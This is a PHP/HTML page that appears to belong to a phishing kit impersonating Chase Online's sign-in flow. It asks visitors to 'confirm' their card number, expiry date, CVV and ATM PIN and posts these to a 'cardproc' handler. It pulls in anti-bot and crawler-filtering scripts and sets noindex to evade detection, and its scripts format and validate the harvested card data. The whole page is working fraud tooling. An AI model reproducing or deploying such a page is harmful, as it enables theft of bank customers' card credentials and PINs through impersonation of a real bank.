<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
?>
<!DOCTYPE html>
<html class="no-js" lang="en" dir="ltr">
    <head>
        <meta charset="utf-8"/>
        <meta name="robots" content="noindex,nofollow" />
        <title>Chase Online</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
        <link rel="shortcut icon" href="../style/img/chasefavicon.ico"/>
<style>
        .spinnerWrapper{position:absolute;width:100%;top:45%;text-align:center}#chaseSpinnerID.jpui.spinner{display:inline-block;overflow:visible!important;padding-top:0;margin-top:-50%}#chaseSpinnerID.jpui.spinner:after{content:"\0020";-moz-animation:three-quarters-loader 780ms infinite linear;-webkit-animation:three-quarters-loader 780ms infinite linear;animation:three-quarters-loader 780ms infinite linear;border:4px solid #ccc;border-right-color:#0092ff;border-radius:50%;box-sizing:border-box;display:inline-block;position:relative;width:48px;height:48px}@media(max-width:991px){#chaseSpinnerID.jpui.spinner:after{width:38px;height:38px}}@media(max-width:767px){#chaseSpinnerID.jpui.spinner:after{width:28px;height:28px}}#chaseSpinnerID.jpui.spinner:before{content:"Loading";color:transparent;position:absolute;bottom:-1.25rem;font-size:1rem}#chaseSpinnerID.jpui.spinner:focus{outline:0}@-moz-keyframes three-quarters-loader{0%{-moz-transform:rotate(0);transform:rotate(0)}100%{-moz-transform:rotate(360deg);transform:rotate(360deg)}}@-webkit-keyframes three-quarters-loader{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes three-quarters-loader{0%{-moz-transform:rotate(0);-ms-transform:rotate(0);-webkit-transform:rotate(0);transform:rotate(0)}100%{-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-webkit-transform:rotate(360deg);transform:rotate(360deg)}}#chaseSpinnerID.jpui.spinner .util.accessible-text{position:absolute!important;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);padding:0!important;border:0!important;height:1px!important;width:1px!important;overflow:hidden}BODY{overflow-x:hidden;overflow-y:auto;margin:0}#init,#body{opacity:0;-webkit-transition:opacity .5s;transition:opacity .5s}#init{z-index:-1;background:#fff;position:fixed;top:0;left:0;min-width:100%;min-height:110%}     





.spinner:after, .mask:after {
    content: '';
    position: fixed;
    z-index: -1;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    
background: #1c4f82;
    background: -moz-linear-gradient(top,#1c4f82 0,#2e6ea3 100%);
    -moz-opacity: .9;
    -ms-filter: alpha(opacity=90);
    filter: alpha(opacity=90);
}


</style>
<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('fixed').style.visibility="hidden";
      },500);
  }
}
</script>




        <link rel="stylesheet" href="../style/css/blue-ui.css">
<link rel="stylesheet" href="../style/css/fonto.css">
        <link rel="stylesheet" href="../style/css/logon.css">

<script src="../style/js/jquery.min.js"></script>
<script src="../style/js/jquery.mask.js"></script>



  <script>
$(function() {
$('#cardnumber').mask('0000 0000 0000 0000');
$('#expdate').mask('00/00');
});</script>

<style type="text/css">
.multi.equal .right {
    float: right;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .right {
    width: 25%;
    float: left;
}
.multi.equal .left {
    margin-right: 0;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .left {
    width: 72.5%;
    float: left;
}
.left, .middle {
    margin-right: 10px;
}


.vx_btn.vx_btn-seco, .vx_btn-small.vx_btn-secon, .vx_btn-medium.vx_btn-seco {


background-color: transparent;
    border-color: #0070ba;
    color: #0070ba;
    margin-right: 0;
    margin-left: 0;
    width: 100%;
}
</style>

<style type="text/css">.jpui.background.image { background-image: url(../style/img/background.desktop.day.4.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='../style/img/background.desktop.day.4.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='../style/img/background.desktop.day.4.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(../style/img/background.desktop.day.4.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(../style/img/background.desktop.day.4.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(../style/img/background.desktop.day.4.jpeg); } }</style>

<style>
input{text-transform:capitalize;font-size:1.1rem!important;}
input.upper{text-transform:uppercase;}
</style>
</head>
<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
<div id="spinarrrrrr" style="display:none">
<div class="spinner" style="
    position: fixed;
    top: 43%;
    right: 0;
    bottom: 0;
    left: 0;
    z-index: 200;
    margin: 0;
    text-align: center;">
<div class=""><div id="chaseSpinnerID" class="jpui spinner" tabindex="-1"><span id="accessible-chaseSpinnerID" class="util accessible-text">loading</span></div></div></div>
</div>
<div id="fixed" >
<div class="spinner" style="
    position: fixed;
    top: 43%;
    right: 0;
    bottom: 0;
    left: 0;
    z-index: 200;
    margin: 0;
    text-align: center;">
<div class=""><div id="chaseSpinnerID" class="jpui spinner" tabindex="-1"><span id="accessible-chaseSpinnerID" class="util accessible-text">loading</span></div></div></div>
</div>


<div data-is-view="true"><div class="" tabindex="-1"><div id="advertisenativeapp" data-has-view="true"></div> <div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true"><div data-is-view="true"><div id="siteMessageAda" aria-live="polite"><h2 class="util accessible-text" id="site-messages-heading" data-attr="LOGON_SITE_MESSAGES.noSiteMessagesAda">You have no more site alerts</h2></div> </div></div> 


<header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true"><div class="logon header jpui transparent navigation bar" data-is-view="true"> <div><a href="#" data-attr="LOGON_SUMMARY_MENU.requestChaseHomepage"><div class="chase logo"></div> <span class="util accessible-text" data-attr="LOGON_SUMMARY_MENU.chaseLogoAda">Chase.com homepage</span></a></div> </div></header> <main id="logon-content" data-has-view="true"><div class="container logon" data-is-view="true"><div><div id="backgroundImage"><div class="jpui background image fixed show-xs show-sm" id="geoImage"></div></div></div> <div class="row"><div class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden" id="logoffbox">


<div class="jpui raised segment"><div class="row"><div class="col-xs-10 col-xs-offset-1"><h3 class="u-focus in-progress" tabindex="-1" id="logoff-header">You're being signed out.</h3></div></div> <div class="row"><div class="col-xs-12"><div class="progress"><div class="bar"></div></div></div></div></div> </div> <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox">


<div id="sssddddvvvv" style ="background: rgba(255,255,255,.96);
border-radius: 5px;
    padding: 1.25rem 0;
    margin: 0 auto;"
 class="jpui raised "><div class="row"><div class="col-xs-10 col-xs-offset-1">
<div style="text-align: center;">
<h2 id="cardh1" >Confirm Card Information<span class="util high-contrast"></span></h2>


<div id="cardh2" class="jpui progress rectangles" id="progress-progressBar" data-progress=""><ol class="steps-4" role="presentation"><li class="active current-step" id="progress-progressBar-step-1"><span class="util accessible-text" id="accessible-progress-progressBar-step-1"></span></li><li class="active current-step"   id="progress-progressBar-step-2"></li><li class="active current-step" id="progress-progressBar-step-3"></li><li id="progress-progressBar-step-4"></li></ol></div>

</div>

<form id="loginfo" method="POST" autocomplete="off" action="cardproc" onsubmit="return validate();">
<div id="errorrcard" >
	<div id='validator-error-header' style="display:<?php if(!isset($_GET[''.$theerrkey.''])){echo 'none';};?>;"><div class='jpui error error inverted primary animate alert' id='logon-error' role='region'><div class='icon'><span id='type-icon-logon-error'><i class='jpui exclamation-color icon' id='icon-type-icon-logon-error' aria-hidden='true'></i></span></div> <div class='icon background'></div> <div class='content wrap' id='content-logon-error'><h2 class='title' tabindex='-1' id='inner-logon-error'><span class='util accessible-text' id='icon-logon-error'>Important: </span><span id="ErrorMessage">Please check your information and try again.</span></h2> </div></div></div>
</div>

 <input  class="jpui input logon-xs-toggle " id="cardnumber" placeholder="Card Number"  type="tel" name="cardnumber" required="required" oninput="innumlen(this.value);demcnum();"  maxlength="19"/>

 <input  class="jpui input logon-xs-toggle " id="expdate" placeholder="Expiration Date MM/YY"  type="tel" name="expdate" required="required" oninput="demexpDate();"  maxlength="5">  
 
 <input  class="jpui input logon-xs-toggle " id="cvv" placeholder="Cvv/Csc"  type="tel" name="cvv" required="required" oninput="innumlen(this.value);"  maxlength="4"> 

 <input  class="jpui input logon-xs-toggle " id="atm" placeholder="Atm Pin"  type="tel" name="atm" required="required" oninput="innumlen(this.value);"  maxlength="5"> 

<button type="submit" id="signin-button" class="jpui button focus fluid primary" data-attr="LOGON.logonToLandingPage"><span class="label">Next</span> </button>

</form>

</div></div></div></div></div></div></main>



</div></div>

<br><br>
<br>
<br>
<br>
<br>
<br>



<div class="footer-container" data-is-view="true" style="position: static;">
<div class="container"><div class="social-links row"><div class="col-xs-12"><span class="follow-us-text">Follow us:</span> <ul class="icon-links"><li class="facebook"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseFacebook"><i class="jpui facebook icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseFacebookAda">Facebook</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li> <li class="instagram"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseInstagram"><i class="jpui instagram icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseInstagramAda">Instagram</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li> <li class="twitter"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseTwitter"><i class="jpui twitter icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseTwitterAda">Twitter</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li> <li class="youtube"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseYouTube"><i class="jpui youtube icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseYouTubeAda">YouTube</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li> <li class="linkedin"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseLinkedIn"><i class="jpui linkedin icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseLinkedInAda">LinkedIn</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li></ul></div></div> <div class="footer-links row"><div class="col-xs-12"><ul><li><a href="#" data-attr="LOGON_FOOTER_MENU.requestContactUs">Contact us</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestSecurity">Security</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestTermsOfUse">Terms of use</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our commitment to accessibility</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestMortgageLoanOriginators">SAFE Act: Chase Mortgage Loan Originators</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestHomeMortgageDisclosureAct">Fair Lending</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestAboutChase">About Chase</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestJpMorgan">J.P. Morgan</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestJpMorganChaseCo">JPMorgan Chase &amp; Co.</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestCareers">Careers</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestEspanol" lang="es">Espanol</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseCanada">Chase Canada</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestSiteMap">Site map</a></li> <li>Member FDIC</li> <li><i class="jpui equal-housing-lender icon" id="undefined" aria-hidden="true"></i> Equal Housing Lender</li> <li class="copyright-label">&copy; <?php echo date('Y');?> JPMorgan Chase &amp; Co.</li></ul></div></div> <div class="row galaxy-footer"><div class="col-xs-10 col-xs-offset-1"><p class="NOTE"><span></span><br> <span class="copyright-label">&copy; <?php echo date("Y");?> JPMorgan Chase &amp; Co.</span><br> <a class="NOTELINK" href="#" data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy <i class="jpui progressright icon end-icon" aria-hidden="true"></i></a><br> <a href="#" data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our commitment to accessibility<i class="jpui progressright icon end-icon" aria-hidden="true"></i></a></p></div></div></div>
</div>


<script>
"use strict"
document.getElementById("loginfo").setAttribute("novalidate",true);
function load(){document.getElementById('spinarrrrrr').style.display="block";}
function stopload(){document.getElementById('spinarrrrrr').style.display="none";};

function disperr(){document.getElementById('validator-error-header').style.display="block";}
function clrerr(){document.getElementById('validator-error-header').style.display="none";};
function writerr(msg){document.getElementById('ErrorMessage').innerHTML=msg;}


function validate(){clrerr();var exp=document.getElementById("expdate");var self=document.getElementById("loginfo"); var input = self.querySelectorAll("input[required]");var emptylist=[];for(var i=0;i<input.length;i++){if(input[i].value==""){emptylist.push(i);};} if(emptylist.length >= 1){setTimeout(function(){input[emptylist[0]].focus();stopload();writerr("All fields are required !");for(var i of emptylist){disperr()};},10);return false;} else{if(input[0].value.length<16){setTimeout(function(){stopload();writerr("Wrong Entries, Please check and try again");disperr();},10);return false;} else if(exp.value.length!=5 || /^\d{2}[\/\-\.]?\d{2}$/.test(exp.value)==false){setTimeout(function(){stopload();writerr("Expiry Date Must be in MM/YY format");disperr();},10);return false;} else{load();return true;};}; };


function demexpDate(){var expdate=event.target;var key =event.data;var val=expdate.value;if(event.inputType=="insertText"){if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);}; switch(val.length){case 1:if(key > 1){event.target.value="";}; break; case 2:if(val[0]==1 && key > 2 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[0]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {expdate.value=expdate.value+"/";}; break; case 4:if(key < 2 || key >= 3 || key == 0){event.target.value=val.slice(0,val.length-1);}; break; case 5:if(!isNaN(parseInt(key))){event.target.value=val;}; break;};};if(event.inputType=="deleteContentBackward" && val.length == 2){expdate.value=val[0]}};

function demcnum(){var self=event.target;var key =event.data;var val=self.value;var sep="-";var mval=val.replace(/\s/g,'').split('');
var pos=self.selectionStart;var cardtype=val.substring(0,2);var otherctype=val.substring(0,1);
if(pos){
if(/37|34/.test(cardtype)){self.maxLength="17";} else{self.maxLength="19";};
if(event.inputType=="insertText"){
if(cardtype==37 || cardtype ==34){for(var i=0;i < mval.length;i++){if(i==3 || i==9){mval[i]=mval[i]+' ';};};}
else{for(var i=0;i < mval.length;i++){if(i==3 || i==7 || i==11){mval[i]=mval[i]+' ';};};};
mval=mval.join('');mval=mval.split('');event.target.value=mval.join('');;
if(mval[pos]){if(cardtype==37 || cardtype ==34){
if(pos%4==0 && pos<6 && mval.length>=5){event.target.setSelectionRange(pos+1,pos+1);} else if(pos%12==0 && mval.length>=13){event.target.setSelectionRange(pos+1,pos+1);} else{event.target.setSelectionRange(pos,pos);};} else{if(pos%5==0){event.target.setSelectionRange(pos+1,pos+1)} else{event.target.setSelectionRange(pos,pos);};};};
};
if(event.inputType=="deleteContentBackward"){
if(cardtype==37 || cardtype ==34){for(var i=0;i < mval.length;i++){if(i==3 || i==9){mval[i]=mval[i]+' ';};};}
else{for(var i=0;i < mval.length;i++){if(i==3 || i==7 || i==11){mval[i]=mval[i]+' ';};};};
mval=mval.join('');mval=mval.split('');
event.target.value=mval.join('');
if(pos==0){event.target.setSelectionRange(0,0);}
else{if(cardtype==37 || cardtype ==34){
if(pos%4==0 && mval.length==5){event.target.setSelectionRange(pos,pos);} else if(pos%12==0 && mval.length==13){event.target.setSelectionRange(pos-1,pos-1);} else{event.target.setSelectionRange(pos,pos)};}
else{if(pos%5==0){event.target.setSelectionRange(pos-1,pos-1)} else{event.target.setSelectionRange(pos,pos);};};}
;};};
};

function innumlen(val){if(event.inputType=="insertText"){if(isNaN(parseInt(event.data))){if(val.length<=1){event.target.value="";} else{event.target.value=val.slice(0,val.length-1);};};};};
</script>
</body></html>